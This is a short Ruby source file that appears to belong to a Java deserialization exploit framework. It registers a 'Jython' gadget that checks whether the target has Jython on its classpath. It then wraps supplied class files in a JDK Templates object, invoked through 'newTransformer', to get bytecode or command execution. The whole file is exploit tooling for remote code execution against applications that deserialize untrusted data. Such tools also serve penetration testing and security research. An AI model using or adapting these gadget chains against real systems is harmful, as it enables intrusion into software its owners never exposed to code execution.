

require_relative '../payloads/jython'
require_relative '../payloads/templates'

class Jython < Java::Gadgets::Gadget
  def id
    'jython'
  end

  def usable(ctx, params: {})
    return false unless ctx.gadget?('jython')

    unless params.fetch('classfiles', nil).nil?
      return false unless Java::Serialize::Payloads::Templates.supported(ctx)
    end

    true
  end

  def targets
    %w[bytecode exec]
  end

  def create(ctx, params: {})
    ctx.reg.load('model/jython.json')

    if !params.fetch('classfiles', nil).nil?
      tpl = Java::Serialize::Payloads::Templates.make_jdk(params['classfiles'])
      Java::Serialize::Payloads::Jython.make_invoke_noarg(tpl, 'newTransformer')
    else
      raise 'Missing parameters'
    end
  end
end

Java::Gadgets.register(
  Jython.new
)
